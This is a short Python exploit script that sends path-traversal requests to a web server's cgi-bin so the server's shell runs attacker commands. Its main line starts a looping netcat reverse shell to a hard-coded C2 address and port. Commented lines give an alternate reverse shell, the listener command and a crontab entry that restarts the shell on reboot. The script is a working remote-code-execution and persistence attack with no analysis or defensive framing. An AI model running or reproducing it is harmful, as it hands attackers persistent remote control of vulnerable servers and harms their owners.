import requests

TARGET = "http://127.0.0.1:8080"
PATH = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
C2_SERVER_IP = "172.24.148.220"
C2_PORT = "8082"
def run_command(cmd):
    session = requests.Session()
    url = TARGET + PATH
    command = f"{cmd};"
    req = requests.Request('POST', url=url, data=command)
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)


if __name__ == "__main__":
                                    # YOUR IP
    #run_command("while true; do nc 172.24.148.220 8082 -e /bin/sh; sleep 2; done")
    run_command("nohup sh -c 'while true; do nc 172.24.148.220 8082 -e /bin/bash; sleep 5; done'")
    run_command('   ')
    # nc -lvnp 8082    on host
    #print("(crontab -l; echo '@reboot nohup /bin/sh -c 'while true; do nc 172.24.148.220 8082 -e /bin/bash; sleep 5; done' &') | crontab -")